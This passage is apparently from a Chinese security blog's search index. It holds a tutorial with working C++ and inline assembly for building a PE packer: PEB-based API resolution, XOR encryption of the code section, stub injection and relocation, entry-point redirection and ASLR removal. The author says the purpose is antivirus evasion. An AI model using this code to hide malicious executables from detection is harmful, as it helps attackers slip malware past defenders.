\u6211\u4eec\u7684\u904d\u5386\u6d41\u7a0b\u662f\uff0c\u5148\u904d\u5386\u540d\u79f0\u8868\u627e\u5230GetProcAddress\u5728\u540d\u79f0\u6570\u7ec4\u4e2d\u7684\u4e0b\u6807\uff0c\u7136\u540e\u6839\u636e\u8fd9\u4e2a\u4e0b\u6807\u53bb\u5e8f\u53f7\u6570\u7ec4\u4e2d\u627e\u76f8\u540c\u4e0b\u6807\u7684\u5e8f\u53f7\u503c\uff0c\u7136\u540e\u4ee5\u8fd9\u4e2a\u5e8f\u53f7\u503c \u4e3a\u4e0b\u6807\u53bb\u627e\u5730\u5740\u6570\u7ec4\u4e2d\u7684\u5bf9\u5e94\u503c\u3002\u6211\u4eec\u627e\u5230\u7684\u5730\u5740\u8868\u4e2d\u7684\u503c\u5c31\u662f\u51fd\u6570\u5165\u53e3 \u4e0b\u9762\u6211\u628a\u8fd9\u6bb5\u7a0b\u5e8f\u7684\u6c47\u7f16\u4ee3\u7801\u653e\u51fa\u6765\u3002\u6211\u662f\u7528\u5185\u8054\u6c47\u7f16\u628a\u8fd9\u6bb5\u4ee3\u7801\u585e\u8fdbC++\u7684 void GetApis() { HMODULE hKernel32; _asm { pushad; ; //\u83b7\u53d6kernel32.dll\u7684\u52a0\u8f7d\u57fa\u5740; mov eax, fs: [0x30] ; //\u5f97\u5230PEB\u5730\u5740 mov eax, [eax + 0ch]; //\u83b7\u5f97LDR_PEB_DATA\u5730\u5740 mov eax, [eax + 0ch]; //\u83b7\u5f97LIST_ENTRY InLoadOrderModuleList;\u5730\u5740 mov eax, [eax]; //\u83b7\u5f97LIST_ENTRY InLoadOrderModuleList\u4e0b\u4e00\u9879\u7684\u5730\u5740 mov eax, [eax]; /\u83b7\u5f97LIST_ENTRY InLoadOrderModuleList\u4e0b\u4e0b\u9879\u5373\u6211\u4eec\u9700\u8981\u7684LIST_ENTRY InInitializationOrderModuleList\u7684\u5730\u5740 mov eax, [eax + 018h]; //\u83b7\u5f97kernel32.dll\u5730\u5740 mov hKernel32, eax; mov ebx, [eax + 03ch];//\u83b7\u5f97kernel32.dll NT\u5934RVA add ebx, eax; //NT\u5934\u7684VA add ebx, 078h; //\u83b7\u5f97\u533a\u6bb5\u8868 mov ebx, [ebx]; //\u83b7\u5f97\u5bfc\u51fa\u8868RVA add ebx, eax; //\u5bfc\u51fa\u8868VA lea ecx, [ebx + 020h]; mov ecx, [ecx]; // ecx => \u540d\u79f0\u8868\u7684\u9996\u5730\u5740(rva); add ecx, eax; // ecx => \u540d\u79f0\u8868\u7684\u9996\u5730\u5740(va); xor edx, edx; // \u4f5c\u4e3a\u7d22\u5f15(index)\u6765\u4f7f\u7528. _WHILE:; mov esi, [ecx + edx * 4];//\u540d\u79f0\u6570\u7ec4\u5165\u53e3\u70b9rva\uff0c\u540d\u79f0\u6570\u7ec4\u5355\u4f4d\u5927\u5c0f4\u5b57\u8282 lea esi, [esi + eax]; //\u5165\u53e3\u70b9VA cmp dword ptr[esi], 050746547h; //\u8fdb\u884c\u540d\u79f0\u5339\u914d\uff0c050746547h\u5373\u5c0f\u7aef\u5b58\u50a8\u7684GetP jne _LOOP;//\u4e0d\u76f8\u7b49\u5c31\u8df3\u5165_LOOP\u6bb5 cmp dword ptr[esi + 4], 041636f72h; //\u540d\u9648\u5339\u914d\uff0crocA\uff0c\u4ee5\u4e0b\u4f9d\u6b21\u4e3addre\uff0css jne _LOOP; cmp dword ptr[esi + 8], 065726464h; jne _LOOP; cmp word ptr[esi + 0ch], 07373h; jne _LOOP; mov edi, [ebx + 024h]; add edi, eax; //\u83b7\u5f97\u5e8f\u53f7\u8868VA mov di, [edi + edx * 2]; //\u83b7\u5f97\u5e8f\u53f7\u6570\u7ec4\u4e2d\u5bf9\u5e94\u4e0b\u6807\u7684\u5730\u5740\uff0c\u5e8f\u53f7\u6570\u7ec4\u5355\u4f4d\u5927\u5c0f2\u5b57\u8282 and edi, 0FFFFh; //\u7ed9di\u63d0\u4f4d\u523032\u4f4d\uff0c\u5373\u7ed9\u4e88edi \u5e8f\u53f7\u8868\u4e2d\u5bf9\u5e94\u4e0b\u6807\u7684\u5730\u5740 mov edx, [ebx + 01ch]; add edx, eax; //\u83b7\u5f97\u5730\u5740\u8868 mov edi, [edx + edi * 4]; //\u83b7\u5f97\u5730\u5740\u6570\u7ec4\u4e2d\uff0c\u5e8f\u53f7\u5bf9\u5e94\u7684\u503c\uff0c\u5730\u5740\u6570\u7ec4\u5355\u4f4d\u5927\u5c0f4\u5b57\u8282 add edi, eax; //\u83b7\u5f97GetProcAddress\u7684\u5165\u53e3\u5730\u5740 mov MyGetProcAddress, edi; //\u8d4b\u503c jmp _ENDWHILE; //END _LOOP:; inc edx; // ++index; jmp _WHILE; _ENDWHILE:; popad; } \u89e3\u5bc6 \u89e3\u5bc6\u4ee3\u7801\u6bb5\u3002\u8fd9\u6bb5\u597d\u5199\u3002 void Decrypt() { unsigned char* pText = (unsigned char*)g_conf.textScnRVA + 0x400000;//\u9501\u5b9a\u5230PE\u6587\u4ef6\u7684text\u6bb5\uff08\u56e0\u4e3a\u52a0\u58f3\u65f6\u53bb\u6389\u4e86\u57fa\u5740\u968f\u673a\u5316\uff0c\u6240\u4ee5\u81ea\u4fe1\u7684\u628a\u57fa\u5740\u586b\u62100x400000 DWORD old = 0; MyVirtualProtect(pText, g_conf.textScnSize, PAGE_READWRITE, &old);//\u4fee\u6539\u4ee3\u7801\u6bb5\u7684\u5c5e\u6027,\u6ce8\u610f\u6211\u4eec\u8fd9\u91cc\u4f7f\u7528\u4e86\u52a8\u6001\u83b7\u5f97\u7684 //\u89e3\u5bc6\u4ee3\u7801\u6bb5 for (DWORD i = 0; i < g_conf.textScnSize; i++) { pText[i] ^= g_conf.key; } //\u628a\u5c5e\u6027\u4fee\u6539\u56de\u53bb MyVirtualProtect(pText, g_conf.textScnSize, old, &old); } \u4fee\u6539\u5165\u53e3\u70b9 _asm { mov eax, g_conf.srcOep; //\u5165\u53e3\u70b9\u662fg_conf.srcOep add eax, 0x400000 jmp eax } \u52a0\u58f3\u5668 \u52a0\u58f3\u5668\u6d41\u7a0b\u5982\u4e0b 1.\u6253\u5f00\u9700\u8981\u88ab\u52a0\u58f3\u7684PE\u6587\u4ef6 2.\u52a0\u8f7dstub 3.\u52a0\u5bc6\u4ee3\u7801\u6bb5 4.\u6dfb\u52a0\u65b0\u533a\u6bb5 5.stub\u91cd\u5b9a\u4f4d\u4fee\u590d 6.stub\u79fb\u690d 7.PE\u6587\u4ef6\u5165\u53e3\u70b9\u4fee\u6539 8.\u53bb\u968f\u673a\u57fa\u5740 9.\u4fdd\u5b58\u6587\u4ef6 \u4ee5\u4e0b\u7684\u5404\u4e2a\u6d41\u7a0b\u63cf\u8ff0\u4e2d\u4f1a\u7528\u5230\u8bf8\u591a\u81ea\u5b9a\u4e49\u51fd\u6570\uff0c\u6211\u5148\u8d34\u4e0a\u6765\u5427\u3002 \u8bf8\u591a\u81ea\u5b9a\u51fd\u6570&\u7ed3\u6784\u4f53 //**************** //\u5bf9\u9f50\u5904\u7406 //time:2020/11/5 //**************** int AlignMent(_In_ int size, _In_ int alignment) { return (size) % (alignment)==0 ? (size) : ((size) / alignment+1) * (alignment); } //*********************** //PE\u4fe1\u606f\u83b7\u53d6\u51fd\u6570\u7c07 //time:2020/11/2 //*********************** PIMAGE_DOS_HEADER GetDosHeader(_In_ char* pBase) { return PIMAGE_DOS_HEADER(pBase); } PIMAGE_NT_HEADERS GetNtHeader(_In_ char* pBase) { return PIMAGE_NT_HEADERS(GetDosHeader(pBase)->e_lfanew+(SIZE_T)pBase); } PIMAGE_FILE_HEADER GetFileHeader(_In_ char* pBase) { return &(GetNtHeader(pBase)->FileHeader); } PIMAGE_OPTIONAL_HEADER32 GetOptHeader(_In_ char* pBase) { return &(GetNtHeader(pBase)->OptionalHeader); } PIMAGE_SECTION_HEADER GetLastSec(_In_ char* pBase) { DWORD SecNum = GetFileHeader(pBase)->NumberOfSections; PIMAGE_SECTION_HEADER FirstSec = IMAGE_FIRST_SECTION(GetNtHeader(pBase)); PIMAGE_SECTION_HEADER LastSec = FirstSec + SecNum - 1; return LastSec; } PIMAGE_SECTION_HEADER GetSecByName(_In_ char* pBase,_In_ const char* name) { DWORD Secnum = GetFileHeader(pBase)->NumberOfSections; PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(GetNtHeader(pBase)); char buf[10] = { 0 }; for (DWORD i = 0; i < Secnum; i++) { memcpy_s(buf, 8, (char*)Section[i].Name, 8); if (!strcmp(buf, name)) { return Section + i; } } return nullptr; } typedef struct _StubConf { DWORD srcOep; //\u5165\u53e3\u70b9 DWORD textScnRVA; //\u4ee3\u7801\u6bb5RVA DWORD textScnSize; //\u4ee3\u7801\u6bb5\u7684\u5927\u5c0f DWORD key; //\u89e3\u5bc6\u5bc6\u94a5 }StubConf; struct StubInfo { char* dllbase; //stub.dll\u7684\u52a0\u8f7d\u57fa\u5740 DWORD pfnStart; //stub.dll(start)\u5bfc\u51fa\u51fd\u6570\u7684\u5730\u5740 StubConf* pStubConf; //stub.dll(g_conf)\u5bfc\u51fa\u5168\u5c40\u53d8\u91cf\u7684\u5730\u5740 }; \u6253\u5f00PE\u6587\u4ef6 \u8fd9\u91cc\u91c7\u7528\u7684\u65b9\u6cd5\u662f\u5229\u7528CreateFileA\u51fd\u6570\u3002\u540c\u65f6\u8fd9\u4e2a\u51fd\u6570\u8fd8\u629b\u51fa\u4e86\u4e00\u4e2a\u6307\u5411PE\u6587\u4ef6\u5927\u5c0f\u7684\u6307\u9488 char* GetFileHmoudle(_In_ const char* path,_Out_opt_ DWORD* nFileSize) { //\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u5e76\u83b7\u5f97\u6587\u4ef6\u53e5\u67c4 HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //\u83b7\u5f97\u6587\u4ef6\u5927\u5c0f DWORD FileSize = GetFileSize(hFile, NULL); //\u8fd4\u56de\u6587\u4ef6\u5927\u5c0f\u5230\u53d8\u91cfnFileSize if(nFileSize) *nFileSize = FileSize; //\u7533\u8bf7\u4e00\u7247\u5927\u5c0f\u4e3aFileSize\u7684\u5185\u5b58\u5e76\u5c06\u6307\u9488\u7f6e\u4e8e\u9996\u4f4d char* pFileBuf = new CHAR[FileSize]{ 0 }; //\u7ed9\u521a\u521a\u7533\u8bf7\u7684\u5185\u5b58\u8bfb\u5165\u6570\u636e DWORD dwRead; ReadFile(hFile, pFileBuf, FileSize, &dwRead, NULL); CloseHandle(hFile); return pFileBuf; } \u52a0\u8f7dSTUB void LoadStub(_In_ StubInfo* pstub) { pstub->dllbase = (char*)LoadLibraryEx(L\"F:\\\\stubdll.dll\", NULL, DONT_RESOLVE_DLL_REFERENCES); pstub->pfnStart = (DWORD)GetProcAddress((HMODULE)pstub->dllbase, \"Start\"); //\u83b7\u5f97stub\u7684\u5165\u53e3\u51fd\u6570Start(\u81ea\u5df1\u5b9a\u4e49\u5728stub\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570 pstub->pStubConf = (StubConf*)GetProcAddress((HMODULE)pstub->dllbase, \"g_conf\"); } //\u4e0d\u4ec5\u52a0\u8f7d\u4e86stub\uff0c\u8fd8\u83b7\u5f97\u4e86stub\u629b\u51fa\u7684\u7528\u4e8e\u6536\u96c6\u4fe1\u606f\u7684\u5168\u5c40\u7ed3\u6784\u4f53\uff08g_conf,\u662f\u4e00\u4e2astub\u629b\u51fa\u7684\u7ed3\u6784\u4f53\uff0c\u7528\u4e8e\u83b7\u53d6\u4fe1\u606f\uff0c\u7ed3\u6784\u5982\u4e0b\uff09 typedef struct _StubConf { DWORD srcOep; //\u5165\u53e3\u70b9 DWORD textScnRVA; //\u4ee3\u7801\u6bb5RVA DWORD textScnSize; //\u4ee3\u7801\u6bb5\u7684\u5927\u5c0f DWORD key; //\u89e3\u5bc6\u5bc6\u94a5 }StubConf; \u52a0\u5bc6\u4ee3\u7801\u6bb5 DWORD textRVA = GetSecByName(PeHmoudle, \".text\")->VirtualAddress; DWORD textSize = GetSecByName(PeHmoudle, \".text\")->Misc.VirtualSize; Encry(PeHmoudle,pstub); void Encry(_In_ char* hpe,_In_ StubInfo pstub) { //\u83b7\u53d6\u4ee3\u7801\u6bb5\u9996\u5730\u5740 BYTE* TargetText = GetSecByName(hpe, \".text\")->PointerToRawData + (BYTE*)hpe; //\u83b7\u53d6\u4ee3\u7801\u6bb5\u5927\u5c0f DWORD TargetTextSize = GetSecByName(hpe, \".text\")->Misc.VirtualSize; //\u52a0\u5bc6\u4ee3\u7801\u6bb5 for (int i = 0; i < TargetTextSize; i++) { TargetText[i] ^= 0x15; } pstub.pStubConf->textScnRVA = GetSecByName(hpe, \".text\")->VirtualAddress; pstub.pStubConf->textScnSize = TargetTextSize; pstub.pStubConf->key = 0x15; } //\u52a0\u5bc6\u4ee3\u7801\u6bb5\uff0c\u5e76\u7ed9\u4e88\u4e86stub\u4e00\u4e9b\u4fe1\u606f \u6dfb\u52a0\u65b0\u533a\u6bb5 char* AddSec(_In_ char*& hpe, _In_ DWORD& filesize, _In_ const char* secname, _In_ const int secsize) { GetFileHeader(hpe)->NumberOfSections++; PIMAGE_SECTION_HEADER pesec = GetLastSec(hpe); //\u8bbe\u7f6e\u533a\u6bb5\u8868\u5c5e\u6027 memcpy(pesec->Name, secname, 8); pesec->Misc.VirtualSize = secsize; pesec->VirtualAddress = (pesec - 1)->VirtualAddress + AlignMent((pesec - 1)->SizeOfRawData,GetOptHeader(hpe)->SectionAlignment); pesec->SizeOfRawData = AlignMent(secsize, GetOptHeader(hpe)->FileAlignment); pesec->PointerToRawData = AlignMent(filesize,GetOptHeader(hpe)->FileAlignment); pesec->Characteristics = 0xE00000E0; //\u8bbe\u7f6eOPT\u5934\u6620\u50cf\u5927\u5c0f GetOptHeader(hpe)->SizeOfImage = pesec->VirtualAddress + pesec->SizeOfRawData; //\u6269\u5145\u6587\u4ef6\u6570\u636e int newSize = pesec->PointerToRawData + pesec->SizeOfRawData; char* nhpe = new char [newSize] {0}; //\u5411\u65b0\u7f13\u51b2\u533a\u5f55\u5165\u6570\u636e memcpy(nhpe, hpe, filesize); //\u7f13\u5b58\u533a\u66f4\u66ff delete hpe; filesize = newSize; return nhpe; } stub\u91cd\u5b9a\u4f4d \u597d\u5bb6\u4f19\uff0c\u8fd9\u4e2a\u4e1c\u897f\u7a0d\u6709\u4e0d\u614e\u5c31\u4f1a\u8ba9\u6574\u4e2a\u7a0b\u5e8f\u62c9\u8de8\u6389\uff08\u8fc7\u6765\u4eba\u7684\u5fe0\u544a \u4e3a\u4ec0\u4e48\u9700\u8981stub\u91cd\u5b9a\u4f4d\u5462\uff1f\u56e0\u4e3a\u6211\u4eec\u7684stub\u6700\u5f00\u59cb\u662f\u52a0\u8f7d\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u5b83\u7684\u8bb8\u591a\u6307\u4ee4\u5982\u8df3\u8f6c\u5230\u7684\u5730\u5740\u662f\u6309\u5185\u5b58\u4e3a\u57fa\u51c6\u786e\u5b9a\u7684\uff0c\u4f46\u662f\u6211\u4eec\u9700\u8981\u628a\u4ed6\u79fb\u690d\u8fdb\u6587\u4ef6\uff0c\u6240\u4ee5\u5b83\u7684\u4ee3\u7801\u91cc\u8bb8\u591a\u5730\u5740\u5c31\u662f\u9519\u8bef\u7684\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u8fd9\u4e9b\u5730\u5740\u8fdb\u884c\u5904\u7406\uff0c\u5373\u91cd\u5b9a\u4f4d\uff0c\u4f7f\u5176\u4ee5\u5bbf\u4e3b\u7a0b\u5e8f\u4e3a\u6807\u51c6\u8fdb\u884c\u5730\u5740\u4fee\u590d\u3002 \u53ef\u80fd\u6211\u8868\u8ff0\u7684\u4e0d\u662f\u5f88\u6e05\u695a\ud83d\ude25\u4e3e\u4e2a\u4f8b\u5b50\u5427\uff0c\u6bd4\u5982stub\u5728\u52a0\u8f7d\u8fdb\u5185\u5b58\u65f6\uff0c\u6709\u4e00\u6761\u8df3\u8f6c\u6307\u4ee4\u65f6jmp 12345678, \u5982\u679c\u6211\u4eec\u4e0d\u5904\u7406\u5c31\u628a\u8fd9\u6761\u6307\u4ee4\u79fb\u690d\u8fdbPE\u6587\u4ef6\uff0c\u90a3\u4e48PE\u6587\u4ef6\u6267\u884c\u5230\u6b64\u5904\u65f6\u5c31\u4f1a\u8df3\u8f6c\u523012345678\uff0c\u6b64\u65f6\u768412345678\u5730\u5740\u53ef\u80fd\u5c31\u5df2\u7ecf\u4e0d\u662fPE\u6587\u4ef6\u52a0\u8f7d\u7684\u5185\u5b58\u533a\u95f4\u4e86\uff0c\u4ece\u800c\u7a0b\u5e8f\u4f1a\u5d29\u6e83\u3002\u6240\u4ee5\u8981\u4fee\u590d\u3002\u6839\u636estub\u7684\u91cd\u5b9a\u4f4d\u8868\u8fdb\u884c\u4fee\u590d\u3002 \u91cd\u5b9a\u4f4d\u8868\u5c31\u662f\u8bb0\u5f55\u54ea\u4e9b\u5730\u5740\u7684\u6570\u636e\u9700\u8981\u88ab\u4fee\u590d\u7684\uff0c\u6211\u4eec\u904d\u5386\u8fd9\u4e9b\u5730\u5740\u8fdb\u884c\u4fee\u590d\u5373\u53ef\u3002 \u5982\u679c\u4ee5\u4e0b\u4ee3\u7801\u770b\u8d77\u6765\u5403\u529b\uff0c\u53ef\u4ee5\u5148\u53bb\u4e86\u89e3\u4e00\u4e0b\u91cd\u5b9a\u4f4d\u8868 void FixStub(DWORD targetDllbase, DWORD stubDllbase,DWORD targetNewScnRva,DWORD stubTextRva ) { //\u627e\u5230stub.dll\u7684\u91cd\u5b9a\u4f4d\u8868 DWORD dwRelRva = GetOptHeader((char*)stubDllbase)->DataDirectory[5].VirtualAddress; IMAGE_BASE_RELOCATION* pRel = (IMAGE_BASE_RELOCATION*)(dwRelRva + stubDllbase); //\u904d\u5386\u91cd\u5b9a\u4f4d\u8868 while (pRel->SizeOfBlock) { struct TypeOffset { WORD offset : 12; WORD type : 4; }; TypeOffset* pTypeOffset = (TypeOffset*)(pRel + 1); DWORD dwCount = (pRel->SizeOfBlock - 8) / 2; //\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u6570\u91cf for (int i = 0; i < dwCount; i++) { if (pTypeOffset[i].type != 3) { continue; } //\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u5730\u5740 DWORD* pFixAddr = (DWORD*)(pRel->VirtualAddress + pTypeOffset[i].offset + stubDllbase); DWORD dwOld; //\u4fee\u6539\u5c5e\u6027\u4e3a\u53ef\u5199 VirtualProtect(pFixAddr, 4, PAGE_READWRITE, &dwOld); //\u53bb\u6389dll\u5f53\u524d\u52a0\u8f7d\u57fa\u5740 *pFixAddr -= stubDllbase; //\u53bb\u6389\u9ed8\u8ba4\u7684\u6bb5\u9996RVA *pFixAddr -= stubTextRva; //\u6362\u4e0a\u76ee\u6807\u6587\u4ef6\u7684\u52a0\u8f7d\u57fa\u5740 *pFixAddr += targetDllbase; //\u52a0\u4e0a\u65b0\u533a\u6bb5\u7684\u6bb5\u9996RVA *pFixAddr += targetNewScnRva; //\u628a\u5c5e\u6027\u4fee\u6539\u56de\u53bb VirtualProtect(pFixAddr, 4, dwOld, &dwOld); } //\u5207\u6362\u5230\u4e0b\u4e00\u4e2a\u91cd\u5b9a\u4f4d\u5757 pRel = (IMAGE_BASE_RELOCATION*)((DWORD)pRel + pRel->SizeOfBlock); } stub\u79fb\u690d \u8fd9\u4e2a\u7b80\u5355\uff0c\u6ca1\u5565\u8bf4\u7684 memcpy(GetLastSec(PeNewHmoudle)->PointerToRawData+ PeNewHmoudle, GetSecByName(pstub.dllbase, \".text\")->VirtualAddress+pstub.dllbase, GetSecByName(pstub.dllbase,\".text\")->Misc.VirtualSize); \u5165\u53e3\u70b9\u4fee\u6539 GetOptHeader(PeNewHmoudle)->AddressOfEntryPoint = pstub.pfnStart-(DWORD)pstub.dllbase-GetSecByName(pstub.dllbase,\".text\")->VirtualAddress+GetLastSec(PeNewHmoudle)->VirtualAddress; \u53bb\u968f\u673a\u57fa\u5740 \u4e0d\u53bb\u6389\u968f\u673a\u57fa\u5740\uff0c\u52a0\u8f7d\u57fa\u5740\u5c31\u662f\u4e0d\u56fa\u5b9a\u7684\uff0c\u4e0d\u65b9\u4fbf\u64cd\u4f5c GetOptHeader(PeNewHmoudle)->DllCharacteristics &= (~0x40); \u4fdd\u5b58\u6587\u4ef6 void SaveFile(_In_ const char* path, _In_ const char* data, _In_ int FileSize) { HANDLE hFile = CreateFileA( path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL ); DWORD Buf = 0; WriteFile(hFile, data, FileSize, &Buf,NULL); CloseHandle(hFile); } \u540e\u8bb0 \u7b2c\u4e00\u6b21\u641e\u5e95\u5c42\u7684\u73a9\u610f\u513f\uff0c\u5bfc\u81f4\u8c03\u8bd5\u8fd9\u4e1c\u897f\u82b1\u4e86\u6211\u4e0d\u5c11\u65f6\u95f4\u3002\u3002 \u4e0d\u8fc7\u5b66\u7684\u8fd8\u662f\uff1f\u86ee\u591a\u7684\uff1f \u52a8\u6001\u8c03\u8bd5\uff0cc++\uff0c\u6c47\u7f16\uff0cPE\u7ed3\u6784\uff0c\u52a8\u6001\u5bfb\u5740\u90fd\u5b66\u5230\u4e86\u4e9b\u3002\uff08\u600e\u4e48\u611f\u89c9\u5728\u5f80\u9006\u5411\u8d70\u4e862333 \u7ee7\u7eed\u5f04\u5427\uff0c\u8fd9\u4e2a\u9879\u76ee\u76ee\u524d\u8fd8\u6709bug\uff0c\u7b49\u4ee5\u540e\u6765\u4e86\u5174\u8da3\u518d\u7ee7\u7eed\u6dfb\u52a0\u66f4\u591a\u66f4\u725b\u903c\u7684\u673a\u5236\u3002","title":"\u4ece0\u5f00\u59cb\u7528C++\u5199\u4e00\u4e2a\u52a0\u58f3\u5668"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#0c","text":"","title":"\u4ece0\u5f00\u59cb\u7528C++\u5199\u4e00\u4e2a\u52a0\u58f3\u5668"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_1","text":"\u52a0\u58f3\u539f\u7406 \u624b\u5de5\u52a0\u58f3 \u771f\u6b63\u7684\u52a0\u58f3\u6d41\u7a0b \u57fa\u4e8ec++\u7684\u58f3\u7f16\u5199 Stub \u5408\u5e76\u6570\u636e\u6bb5 PEB\u52a8\u6001\u5bfb\u5740&\u5bfc\u51fa\u8868\u904d\u5386\u627e\u51fd\u6570 \u89e3\u5bc6 \u4fee\u6539\u5165\u53e3\u70b9 \u52a0\u58f3\u5668 \u8bf8\u591a\u81ea\u5b9a\u51fd\u6570&\u7ed3\u6784\u4f53 \u6253\u5f00PE\u6587\u4ef6 \u52a0\u8f7dSTUB \u52a0\u5bc6\u4ee3\u7801\u6bb5 \u6dfb\u52a0\u65b0\u533a\u6bb5 stub\u91cd\u5b9a\u4f4d stub\u79fb\u690d \u5165\u53e3\u70b9\u4fee\u6539 \u53bb\u968f\u673a\u57fa\u5740 \u4fdd\u5b58\u6587\u4ef6 \u540e\u8bb0 \u53c2\u8003: https://blog.csdn.net/qq_31507523/article/details/89438410 \u5b66\u4e60\u4e00\u4e0b\u5199\u58f3\uff0c\u5728\u4ee5\u540e\u514d\u6740\u4e2d\u4f7f\u7528\u3002","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_2","text":"","title":"\u52a0\u58f3\u539f\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_3","text":"\u7528010editor\u624b\u5de5\u52a0\u58f3\u4e86\u89e3\u4e00\u6ce2\u539f\u7406\u3002\u52a0\u58f3\u539f\u7406\u5927\u81f4\u5982\u4e0b \u5373\u6211\u4eec\u5411PE\u6587\u4ef6\u6dfb\u52a0\u4e00\u4e2a\u533a\u6bb5\u5e76\u5c06\u5176\u8bbe\u7f6e\u4e3a\u5165\u53e3\u70b9\uff0c\u8fd9\u6837PE\u6587\u4ef6\u6700\u5f00\u59cb\u6267\u884c\u7684\u547d\u4ee4\u5c31\u662f\u6211\u4eec\u6dfb\u52a0\u7684\u533a\u6bb5\u4e5f\u5c31\u662f\u58f3\u7684\u6307\u4ee4\uff0c\u58f3\u5bf9\u52a0\u5bc6\u533a\u8fdb\u884c\u89e3\u5bc6\uff0c\u5bf9\u538b\u7f29\u533a\u8fdb\u884c\u89e3\u538b\uff0c\u5c06\u539f\u672c\u7684EXE\u6587\u4ef6\u8fd8\u539f\u51fa\u6765\uff0c\u7136\u540e\u8df3\u8f6c\u81f3\u539f\u7a0b\u5e8f\u5165\u53e3\uff0c\u7a0b\u5e8f\u7167\u5e38\u8fd0\u884c\u3002 \u9996\u5148\u751f\u6210\u4e00\u4e2a\u6253\u5370hello\u7684exe\u6587\u4ef6\u3002 #include <stdio.h> int main() { printf(\"hello\"); } \u6211\u4eec\u76ee\u524d\u8981\u5e72\u7684\u4e8b\u60c5\u662f:\u4ee5\u624b\u52a8\u7684\u5f62\u5f0f\u5411PE\u6587\u4ef6\u6dfb\u52a0\u4e00\u4e2a\u58f3\u90e8\u5206\u5e76\u8bbe\u4e3a\u7a0b\u5e8f\u5165\u53e3\uff0c\u5e76\u4f7f\u5176\u80fd\u8df3\u8f6c\u56de\u539f\u5165\u53e3\u3002 \u90a3\u5c31\u6765\u5427 \u7528010editor\u6253\u5f00\u6211\u4eec\u7684exe\u6587\u4ef6\uff0c\u542f\u7528exe\u6a21\u677f\u5206\u6790\u3002 \u6211\u4eec\u9996\u5148\u4fee\u6539\u5176\u6587\u4ef6\u5934numverofsection\u5c5e\u6027\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7528\u6765\u5b9a\u4e49\u5f53\u524dPE\u6587\u4ef6\u5b58\u5728\u591a\u5c11\u4e2a\u533a\u6bb5,\u56e0\u4e3a\u6211\u4eec\u8981\u6dfb\u52a0\u4e00\u4e2a\u58f3\u533a\u6bb5\uff0c\u6240\u4ee5\u6211\u4eec\u5c06\u5176\u52a01\u53d8\u62106 \u5728\u6211\u4eec\u91cd\u8f7d\u6a21\u677f\u540e\u6211\u4eec\u5c31\u4f1a\u5728\u533a\u6bb5\u8868\u53d1\u73b0\u591a\u51fa\u6765\u4e00\u4e2a\u7a7a\u7684\u533a\u6bb5\u8868 \u4ece\u4e0a\u5230\u4e0b\u5404\u4e2a\u6bd4\u8f83\u91cd\u8981\u5b57\u6bb5\u7684\u610f\u601d\u662f \\1. Name \u8868\u793a\u8be5\u533a\u6bb5\u7684\u540d\u5b57 2.VirtualSize \u8868\u793a\u5728\u5185\u5b58\u4e2d\u7684\u5927\u5c0f(\u4e00\u822c\u5185\u5b58\u5bf9\u9f50\u4e3a0x1000) 3.virtualaddress \u865a\u62df\u5730\u5740 \u5373\u4e0a\u4e00\u4e2a\u533a\u6bb5\u7684VirtualAddress + \u4e0a\u4e00\u4e2a\u533a\u6bb5\u7ecf\u5185\u5b58\u5bf9\u9f50\u7c92\u5ea6\u5bf9\u9f50\u540e\u7684\u5927\u5c0f 4.sizeofdata \u8868\u793a\u5728\u6587\u4ef6\u4e2d\u7684\u5927\u5c0f\uff08\u4e00\u822c\u6587\u4ef6\u5bf9\u9f50\u4e3a0x200) 5.pointertorawdata 